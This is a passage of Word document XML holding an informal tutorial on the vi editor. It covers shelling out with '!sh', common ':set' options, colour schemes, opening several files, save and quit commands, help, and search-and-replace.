        <w:t>without quitting from VI editor</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> you can go by executing !</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>sh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> from VI and then come back to VI editor by just executing command "exit" from  shell.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE99AC1" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:spacing w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Some Useful VI Editor options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE2B029" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:spacing w:after="240" w:line="360" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>VI editor is full of options but we don't really use most of them here I am listing some of the option which I use most frequently and found quite useful.</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r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:set nu</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -- This will display line number in front of each line quite useful if you want line by line information. You can turn it off by executing "set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nonu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>". Remember for turning it off put "no" in front of option, like here option is "nu" so for turning it off use "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nonu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>".</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r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">:set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hlsearch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> -- This will highlight the matching word when we do search in VI editor, quite useful but if you find it annoying or not able to see sometime due to your color scheme you can turn it off by executing set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nohlsearch</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67DC1B99" w14:textId="77777777" w:rsidR="008B0010" w:rsidRPr="00AD72DF" w:rsidRDefault="008B0010" w:rsidP="008B0010">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>:set wrap</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> -- If your file has contains some long lines and you want them to wrap use this option, if its already on and you just don't want them to wrap use set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>nowrap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>colorscheme</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> -- color scheme is used to change color of VIM editor, my favorite color scheme is murphy so if you want to change color scheme of VI editor you can do by executing "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>colorscheme</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> murphy ".</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>:syntax on</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> -- syntax can be turn on and off based on your need , if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>its</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> on it will display color syntax for .xml, .html and .</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>perl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> files.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">:set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>ignorecase</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> : This VI editor option allows you do case insensitive search because if its set VI will not distinguish between two words which are just differ in case.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">:set </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>smartcase</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>  : Another VI editor option which allows case-sensitive search if the word you are searching contains an uppercase character.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Opening multiple files in VI Editor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="021B9F91" w14:textId="77777777" w:rsidR="008B0010" w:rsidRPr="00AD72DF" w:rsidRDefault="008B0010" w:rsidP="008B0010">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Sometime we just want to open 2 or 3 files in one go and then wanted to navigate on those. we can do this easily in VI editor by just giving file name separated with space while executing Vim or VI command e.g. vim file1 file2 file3 . For navigating between those file we can use option </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="993300"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":n"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">  for going to next file. You can also open any file at any time from VI editor by executing </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="993300"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":e filename</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">" or reload the same file by just executing </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="993300"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>":e" (without file name)</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</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r>
    </w:p>
    <w:p w14:paraId="78C52F20" w14:textId="77777777" w:rsidR="008B0010" w:rsidRPr="00AD72DF" w:rsidRDefault="008B0010" w:rsidP="008B0010">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Saving and Quitting from VI Editor in Unix</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF26601" w14:textId="77777777" w:rsidR="008B0010" w:rsidRPr="00AD72DF" w:rsidRDefault="008B0010" w:rsidP="008B0010">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Once we done with our change in VI editor we either wants to save or quite from the file, here are the commands to do so.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t>:w -- to save file anytime</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>wq</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> -- most used to save data and quit</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t>:q! -- quit without saving</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>wq</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>! -- to save change in file opened in read-only mode.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
    </w:p>
    <w:p w14:paraId="596FB226" w14:textId="77777777" w:rsidR="008B0010" w:rsidRPr="00AD72DF" w:rsidRDefault="008B0010" w:rsidP="008B0010">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Checking history and getting help in VI editor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44E35CBE" w14:textId="77777777" w:rsidR="008B0010" w:rsidRPr="00AD72DF" w:rsidRDefault="008B0010" w:rsidP="008B0010">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">if you ask me list one command you always want to remember I would say "history" because by using "history" I can get all commands I have executed in past. Same way by typing </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="993300"/>
        </w:rPr>
        <w:t>"!history"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> we can get all commands we have executed from VI editor. This is immensely powerful and I use it a lot. Another command which is important to remember </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="993300"/>
        </w:rPr>
        <w:t>is ":help"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> by typing this you can access the help system provided by VI. If you are interested on any particular command you can type ":help command" and it will display help information for that command.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>find and replace in vi editor</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D634801" w14:textId="62FED787" w:rsidR="008B0010" w:rsidRPr="00AD72DF" w:rsidRDefault="008B0010" w:rsidP="008B0010">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">don't confuse this with </w:t>
      </w:r>
      <w:hyperlink r:id="rId66" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
          </w:rPr>
          <w:t>find command in UNIX</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> , VI editor provides easy commands to search and replace, perform global search and local search. I would suggest practice it a few times to get hold of it and understand </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>its</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> working. we use ":s" (substitute) command for search and replace in VI editor.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t>The  “:s”   command look for a particular pattern and replaces with provide substitution, here are some examples of using search and replace in VI editor.</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t>In Vi editor search and replace, "g" stands for global search here which means all occurrence of a particular word in a line changed rather than just first word, which is default behavior if you don't use global search</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>:%s/Stock/Equity/g</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">    This is an example of global search it will replace all occurrence of word "Stock" in file with word "Equity". </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Its</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> also equivalent to following command </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
